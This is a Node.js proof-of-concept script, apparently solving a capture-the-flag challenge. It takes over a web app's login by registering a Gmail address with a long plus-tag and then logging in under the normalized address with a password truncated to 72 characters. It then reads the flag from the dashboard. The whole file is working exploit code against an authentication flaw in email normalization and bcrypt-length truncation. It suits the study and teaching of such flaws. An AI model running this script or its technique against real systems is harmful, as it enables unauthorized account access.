const BASE = process.argv[2] || 'http://localhost:3000';

function buildEmails() {
  const normalizedLocal = 'a'.repeat(54);
  const plusTag = 'b'.repeat(100);
  const rawLocal = normalizedLocal + '+' + plusTag;
  const domain = '@gmail.com';
  const rawEmail = rawLocal + domain;
  const normEmail = normalizedLocal + domain;
  const password = rawLocal.slice(0, 72);
  return { rawEmail, normEmail, password };
}

function parseSetCookie(headers) {
  const set = headers.get('set-cookie');
  if (!set) return {};
  const jar = {};
  const cookies = Array.isArray(set) ? set : [set];
  for (const line of cookies) {
    const pair = line.split(';', 1)[0];
    const idx = pair.indexOf('=');
    if (idx > 0) {
      const name = pair.slice(0, idx).trim();
      const value = pair.slice(idx + 1).trim();
      jar[name] = value;
    }
  }
  return jar;
}

function jarToHeader(jar) {
  return Object.entries(jar)
    .map(([k, v]) => `${k}=${v}`)
    .join('; ');
}

async function fetchWithJar(url, opts, jar) {
  const headers = Object.assign({}, opts?.headers);
  if (jar && Object.keys(jar).length) headers['Cookie'] = jarToHeader(jar);
  const res = await fetch(url, { ...opts, headers, redirect: 'manual' });
  const newCookies = parseSetCookie(res.headers);
  Object.assign(jar, newCookies);
  return res;
}

async function main() {
  if (typeof fetch !== 'function') {
    console.error('This PoC requires Node 18+ with global fetch.');
    process.exit(1);
  }

  const { rawEmail, normEmail, password } = buildEmails();
  const jar = {};

  console.log('[+] Crafted emails:');
  console.log(`    Raw:  ${rawEmail}`);
  console.log(`    Norm: ${normEmail}`);
  console.log(`    Pwd:  ${password}`);
  console.log(`[+] Registering ${normEmail} (raw length ${rawEmail.length})`);
  let res = await fetchWithJar(`${BASE}/user`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: `email=${encodeURIComponent(rawEmail)}`,
  }, jar);
  console.log(`[+] Register response: ${res.status}`);

  await new Promise((r) => setTimeout(r, 300));
  console.log('[+] Logging in with known truncated password');
  res = await fetchWithJar(`${BASE}/session`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: `email=${encodeURIComponent(normEmail)}&password=${encodeURIComponent(password)}`,
  }, jar);
  console.log(`[+] Login response: ${res.status}`);

  await new Promise((r) => setTimeout(r, 300));
  console.log('[+] Fetching dashboard');
  res = await fetchWithJar(`${BASE}/dashboard`, { method: 'GET' }, jar);
  const html = await res.text();
  console.log(`[+] Dashboard: ${res.status}`);

  const m = html.match(/<span id="flag">([\s\S]*?)<\/span>/);
  if (m) {
    const flag = m[1].trim();
    console.log(`[+] Flag: ${flag}`);
  } else {
    console.log('[!] Flag span not found. Full body follows:\n');
    console.log(html);
  }
}

main().catch((e) => {
  console.error('[!] PoC error:', e);
  process.exit(1);
});
